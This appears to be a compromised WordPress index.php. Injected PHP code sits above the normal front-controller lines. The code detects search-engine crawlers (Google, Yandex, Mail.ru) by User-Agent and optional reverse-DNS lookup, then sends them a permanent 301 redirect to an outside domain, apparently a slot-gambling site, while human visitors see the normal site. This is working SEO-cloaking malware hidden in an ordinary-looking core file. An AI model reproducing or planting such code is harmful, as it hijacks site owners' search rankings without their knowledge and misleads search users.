<?php
$configRed = array ();
$configRed["new_domain"] = "https://topslot.azurewebsites.net/";
$configRed["strong_filter_bots"] = 0;

function redCurrentPageUrl()
{
    $pageURL = 'http';
    if (@$_SERVER["HTTPS"] == "on") {
        $pageURL .= "s";
    }
    $pageURL .= "://";


    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
    }

    return $pageURL;
}
function isMoreBotRecognition ($configRed,$ip)
{
    if($configRed["strong_filter_bots"]==0)
        return true;

    $hostname = strtolower(gethostbyaddr($ip));
    $fileUserAgents="google,yandex,mail.ru,bing";
    foreach(explode(",",$fileUserAgents) as $search_ag)
    {
        if (strpos($hostname,$search_ag)!==false)
            return true;
    }
    return false;
}
function getUserIp ()
{
    $_SERVER['REMOTE_ADDR'] = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];

    if ($_SERVER['REMOTE_ADDR'] != "127.0.0.1")
        return $_SERVER['REMOTE_ADDR'];

    if (isset ($_SERVER['HTTP_X_FORWARD_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARD_FOR'];
    else
        $ip = $_SERVER['REMOTE_ADDR'];

    if ($ip == "127.0.0.1")
    {
        if (isset ($_SERVER["HTTP_X_REAL_IP"]))
            $ip = $_SERVER["HTTP_X_REAL_IP"];
    }

    return $ip;
}
function redirectSearchEngines ($config)
{
    $useragent = $_SERVER["HTTP_USER_AGENT"];
    $useragent = strtolower($useragent);
    //$useragent = "googlebot";

    if (strpos($useragent, "googlebot") !== false || strpos($useragent, "google") !== false || strpos($useragent, "yandex") !== false || strpos($useragent, "mail.ru") !== false) {
        $currentPageUrl = redCurrentPageUrl();
        $oldDomain = parse_url($currentPageUrl);
        $newDomain = parse_url($config["new_domain"]);

        if(strtolower($oldDomain["host"])!=strtolower($newDomain["host"]))
        {
            $ip=getUserIp();
            $isMoreBotRecognition=isMoreBotRecognition($config,$ip);
            if($isMoreBotRecognition)
            {
                $newUrl = str_replace("//" . $oldDomain["host"], "//" . $newDomain["host"], $currentPageUrl);
                $newUrl = str_replace($oldDomain["scheme"] . "://", $newDomain["scheme"] . "://", $newUrl);
                $newUrl = str_replace(":443","", $newUrl);

                header('HTTP/1.1 301 Moved Permanently');
                header("Location: $newUrl");
                exit;
            }
        }
    }
}

redirectSearchEngines($configRed);
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
